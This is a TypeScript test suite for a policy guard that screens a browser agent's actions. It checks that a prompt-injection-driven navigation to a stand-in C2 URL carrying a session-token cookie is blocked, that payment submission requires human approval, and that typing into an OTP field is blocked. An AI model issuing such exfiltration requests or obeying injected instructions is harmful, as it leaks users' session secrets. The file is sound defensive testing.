import { test, describe } from 'node:test';
import * as assert from 'node:assert';
import { DeterministicPolicyGuard } from '../../src/policy/guard.ts';
import type { Action } from '../../src/core/types.ts';

describe('Security & Threat Defense Suite', () => {
  const guard = new DeterministicPolicyGuard({
    allowedHosts: ['localhost', '127.0.0.1', 'demo-university.edu']
  });

  test('THREAT 1: Prompt Injection Exfiltration via navigation is strictly blocked', () => {
    const maliciousAction: Action = {
      id: 'sec_act_1',
      type: 'NAVIGATE',
      target: 'browser',
      value: 'http://malicious-c2-server.com/collect?cookies=secret_session_token',
      isStateChanging: false,
      humanLabel: 'Attacker Triggered Navigation'
    };

    const result = guard.evaluateAction(maliciousAction);
    assert.strictEqual(result.status, 'BLOCK');
    assert.strictEqual(result.violatedRule, 'RULE_NETWORK_ALLOWLIST');
    assert.strictEqual(result.riskLevel, 'CRITICAL');
  });

  test('THREAT 2: Unauthorized transaction execution is halted by Human Approval Gate', () => {
    const unauthorizedCheckout: Action = {
      id: 'sec_act_2',
      type: 'SUBMIT',
      target: 'button#btn-pay-now',
      isStateChanging: true,
      humanLabel: 'Authorize Payment'
    };

    const result = guard.evaluateAction(unauthorizedCheckout);
    assert.strictEqual(result.status, 'REQUIRE_APPROVAL');
    assert.strictEqual(result.violatedRule, 'RULE_HUMAN_APPROVAL_GATE');
  });

  test('THREAT 3: Attacker trying to type into password or OTP field is blocked', () => {
    const autofillOtp: Action = {
      id: 'sec_act_3',
      type: 'TYPE',
      target: 'input#two-factor-otp',
      value: '849201',
      isStateChanging: false,
      humanLabel: 'Fill 2FA OTP'
    };

    const result = guard.evaluateAction(autofillOtp);
    assert.strictEqual(result.status, 'BLOCK');
    assert.strictEqual(result.violatedRule, 'RULE_SECRET_FIELD_BAN');
  });
});
